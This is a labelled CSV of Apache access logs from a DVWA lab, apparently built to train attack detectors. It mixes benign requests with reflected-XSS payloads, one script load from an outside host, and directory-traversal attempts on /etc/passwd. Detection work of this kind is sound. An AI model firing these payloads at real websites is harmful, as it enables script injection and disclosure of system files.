,url,normal,xss,dir
2587,"127.0.0.1 - - [03/May/2021:03:20:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lang HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8688,"127.0.0.1 - - [03/May/2021:03:19:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Karylin HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7092,"127.0.0.1 - - [03/May/2021:03:28:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vinod HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9730,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""></iframe><script>alert(123)</script> HTTP/1.1"" 200 1715 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
10672,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><font onload=alert(1)></font>"" 400 0 ""-"" ""-""",0,1,0
20452,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<<SCRIPT>%(payload)s//<</SCRIPT> HTTP/1.1"" 200 1715 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
108,"127.0.0.1 - - [03/May/2021:03:16:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gayronza HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8526,"127.0.0.1 - - [03/May/2021:03:10:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alina HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9261,"127.0.0.1 - - [03/May/2021:03:06:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=incs HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1016,"127.0.0.1 - - [03/May/2021:10:06:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=./\\/././\\/././\\/././\\/././\\/././\\/././\\/././\\/./etc/passwd HTTP/1.1"" 200 1352 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
11409,"127.0.0.1 - - [03/May/2021:03:14:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Devin HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11834,"127.0.0.1 - - [03/May/2021:03:06:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=gucci HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11207,"127.0.0.1 - - [03/May/2021:03:20:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lennart HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11394,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bgsound src=\""javascript:document.vulnerable=true;\"">"" 400 0 ""-"" ""-""",0,1,0
1735,"127.0.0.1 - - [03/May/2021:03:14:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dieuwertje HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2107,"127.0.0.1 - - [03/May/2021:03:27:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Trescha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18274,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script\\x20type=\""text/javascript\"">javascript:alert(1);</script> HTTP/1.1"" 200 1718 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
572,"127.0.0.1 - - [03/May/2021:03:14:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Domini HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7599,"127.0.0.1 - - [03/May/2021:02:23:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='-alert(1)-' HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
19181,"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<center draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
11414,"127.0.0.1 - - [03/May/2021:03:21:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Manuela HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16768,"127.0.0.1 - - [03/May/2021:03:15:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Eolanda HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
120,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture id=x"" 400 0 ""-"" ""-""",0,1,0
7057,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;BASE HREF=\\\""javascript&#058;alert('XSS');//\\\""&gt;"" 400 0 ""-"" ""-""",0,1,0
5843,"127.0.0.1 - - [03/May/2021:03:14:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dotti HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4748,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><nextid"" 400 0 ""-"" ""-""",0,1,0
11617,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a onmouseout=\""alert(1)\"">test</a>"" 400 0 ""-"" ""-""",0,1,0
17421,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY ONLOAD=alert('XSS')>"" 400 0 ""-"" ""-""",0,1,0
18922,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<optgroup draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
8330,"127.0.0.1 - - [03/May/2021:03:22:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Miriam HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8141,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x11onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",0,1,0
6709,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;HTML xmlns:xss&gt;"" 400 0 ""-"" ""-""",0,1,0
8817,"127.0.0.1 - - [03/May/2021:03:07:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pub HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4315,"127.0.0.1 - - [03/May/2021:03:26:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shila HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18394,"127.0.0.1 - - [03/May/2021:03:19:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Julio HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20202,"127.0.0.1 - - [03/May/2021:03:10:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alameda HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1971,"127.0.0.1 - - [03/May/2021:10:06:09 -0400] ""GET /DVWA/vulnerabilities/fi/?page=....\\....\\....\\....\\....\\....\\....\\etc\\passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
15162,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<td draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
962,"127.0.0.1 - - [03/May/2021:10:06:23 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
6200,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",0,1,0
15072,"127.0.0.1 - - [03/May/2021:03:20:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lorrie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15159,"127.0.0.1 - - [03/May/2021:03:18:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Izzy HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12653,"127.0.0.1 - - [03/May/2021:03:13:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Clarie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11437,"127.0.0.1 - - [03/May/2021:10:23:57 -0400] ""GET /DVWA/vulnerabilities/fi/?page=exec.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3649,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\""XSS\"")>"" 400 0 ""-"" ""-""",0,1,0
15356,"127.0.0.1 - - [03/May/2021:03:08:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=virtual HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2246,"127.0.0.1 - - [03/May/2021:03:18:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jean-Luc HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15509,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<button onmouseover=\""alert(1)\"">test</button>"" 400 0 ""-"" ""-""",0,1,0
13129,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Myrilla HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3368,"127.0.0.1 - - [03/May/2021:03:17:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Iolanthe HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7985,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
11230,"127.0.0.1 - - [03/May/2021:03:26:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Simeon HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11869,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmouseleave=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",0,1,0
17803,"127.0.0.1 - - [03/May/2021:03:09:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Abraham HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18032,"127.0.0.1 - - [03/May/2021:03:12:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bonnar HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2717,"127.0.0.1 - - [03/May/2021:03:26:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tamera HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12291,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x06javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
5904,"127.0.0.1 - - [03/May/2021:03:25:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sheila HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
351,"127.0.0.1 - - [03/May/2021:03:41:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<wbr onmousedown=\""alert(1)\"">test</wbr>"" 400 0 ""-"" ""-""",0,1,0
11196,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY ONLOAD=alert('hellox"" 400 0 ""-"" ""-""",0,1,0
16091,"127.0.0.1 - - [03/May/2021:03:24:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Philomena HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10773,"127.0.0.1 - - [03/May/2021:10:23:27 -0400] ""GET /DVWA/vulnerabilities/fi/?page=account.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12027,"127.0.0.1 - - [03/May/2021:03:18:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jillayne HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6640,"127.0.0.1 - - [03/May/2021:03:20:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Larysa HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17380,"127.0.0.1 - - [03/May/2021:03:06:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=jocs HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16422,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><rp"" 400 0 ""-"" ""-""",0,1,0
9947,"127.0.0.1 - - [03/May/2021:10:05:09 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
590,"127.0.0.1 - - [03/May/2021:03:15:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elladine HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1593,"127.0.0.1 - - [03/May/2021:10:23:24 -0400] ""GET /DVWA/vulnerabilities/fi/?page=e.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13765,"127.0.0.1 - - [03/May/2021:03:13:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cherlyn HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20210,"127.0.0.1 - - [03/May/2021:03:41:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><basefont"" 400 0 ""-"" ""-""",0,1,0
17407,"127.0.0.1 - - [03/May/2021:03:06:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=holly HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14188,"127.0.0.1 - - [03/May/2021:03:15:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ephraim HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19884,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<q oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
17979,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x00javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
3005,"127.0.0.1 - - [03/May/2021:03:24:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Poh-Soon HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13564,"127.0.0.1 - - [03/May/2021:03:21:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Madelene HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17011,"127.0.0.1 - - [03/May/2021:03:07:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ne HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9616,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script SRC=\""http://www.securitycompass.com/xss.jpg\""></script>"" 400 0 ""-"" ""-""",0,1,0
14245,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
15985,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onfocusout=alert(1)"" 400 0 ""-"" ""-""",0,1,0
456,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<li id=x"" 400 0 ""-"" ""-""",0,1,0
12953,"127.0.0.1 - - [03/May/2021:03:24:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rini HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6234,"127.0.0.1 - - [03/May/2021:03:11:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bhagvat HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14335,"127.0.0.1 - - [03/May/2021:03:27:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Venkat HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8547,"127.0.0.1 - - [03/May/2021:03:18:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jemmy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2131,"127.0.0.1 - - [03/May/2021:03:28:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yvet HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15575,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track ondblclick=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",0,1,0
18244,"127.0.0.1 - - [03/May/2021:10:05:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
1266,"127.0.0.1 - - [03/May/2021:03:24:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Peri HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1514,"127.0.0.1 - - [03/May/2021:03:27:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vimal HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2114,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<video autoplay"" 400 0 ""-"" ""-""",0,1,0
2963,"127.0.0.1 - - [03/May/2021:03:17:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ingaborg HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3672,"127.0.0.1 - - [03/May/2021:03:27:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tidwell HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
